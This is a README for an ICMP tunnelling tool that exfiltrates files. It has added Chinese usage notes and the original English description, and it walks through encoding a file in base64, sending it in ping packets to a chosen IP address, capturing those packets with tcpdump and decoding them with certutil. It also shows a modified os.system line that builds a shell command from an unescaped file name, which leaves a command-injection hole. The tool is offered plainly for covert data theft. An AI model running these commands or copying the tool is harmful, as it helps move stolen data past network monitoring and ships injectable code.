#增加使用说明 by Eleven

1、在接收机器上运行tcpdump监听并接收icmp数据包

tcpdump -i eth0 icmp and icmp[icmptype]=icmp-echo -XX -vvv -w output.txt
参数说明：

（1）-i eth0　　　　　　　　　　　　　　　　　　　　　　　　　　　 指定监听的网卡

（2）icmp and icmp[icmptype]=icmp-echo -XX -vvv　　　　　　   监听策略，过滤出icmp数据包

（3）-w output.txt　　　　　　　　　　　　　　　　　　　　　　　　指定输出文件为output.txt

2、通过下面的命令运行工具脚本，发送文件，它会自动转换为base64编码发送

sudo python icmp_transmitter.py test x.x.x.x
 参数说明：

（1）test:　　　　我们要发送的文件

（2）x.x.x.x:　　 指定要发送给哪个主机的ip

注：原来这个工具是windows下的，用了certutil进行了编码，由于我这里用的linux，所以对他的代码进行了些许修改，即把原来init函数中的

os.system("certutil -encode  "+ file +" test.txt")
改为了
os.system("base64  "+ file +" > test.txt")
使用windows的同学就不用改了



****************************************************万恶分界线*****************************************************
# Data Ex-filteration over ICMP Tunnel

__icmp_transmitter.exe__ is an executable used to send files on one system to another using icmp ping packets. The tool first converts the file(an exe, image, document etc) to base64 encoded text. This will then send the ping requests each with 64 characters of data taken from the base64 encoded text file. The tools needs a packet capture softwares on the other side to capture and record all the ping packets as .pcap or .txt files. Use the parser.sh to quickly parse the pcap file and have the text file with base64 encoded data. Once this is done, use certutil to convert back the text file into respective file format.

### Usage:

```icmp_transmitter.exe "input_file_to_be_sent" "IP_address_to_be_sent"```

at the server end:
 
run tcpdump. Use the following command :

```sudo tcpdump -i eth0 icmp and icmp[icmptype]=icmp-echo -XX -vvv -w output.txt```

Use certutil to decode the base64 data to respective format

```certutil -decode "base_64_encoded_textfile" "file.extention"```

The files and source code can be downloaded from: https://github.com/NotSoSecure/icmp_tunnel_ex_filtrate/releases
